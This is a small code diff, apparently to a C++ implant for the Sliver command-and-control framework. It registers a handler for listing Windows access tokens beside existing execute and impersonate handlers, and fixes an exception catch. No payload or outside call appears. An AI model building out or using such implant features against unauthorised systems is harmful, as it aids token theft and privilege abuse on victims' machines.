@@ -34,6 +34,7 @@ namespace handlers {
 		{sliverpb::MsgExecuteWindowsReq,static_cast<handler>(executeHandler)},
 		{sliverpb::MsgExecuteReq,static_cast<handler>(executeHandler)},
 		{sliverpb::MsgImpersonateReq,static_cast<handler>(impersonateHandler)},
+		{sliverpb::MsgListTokensReq,static_cast<handler>(ListTokensHandler)},
 		{sliverpb::MsgPsReq,static_cast<handler>(psHandler)}
 	};
 	
@@ -295,7 +296,7 @@ namespace handlers {
 				resp.set_allocated_response(common_resp);
 			}
 		}
-		catch (exception e) {
+		catch (exception& e) {
 			sliverpb::Response* common_resp = new sliverpb::Response();
 			common_resp->set_err(string{ "[-] Impersonate thrown following exception:\n" }+e.what());
 			resp.set_allocated_response(common_resp);
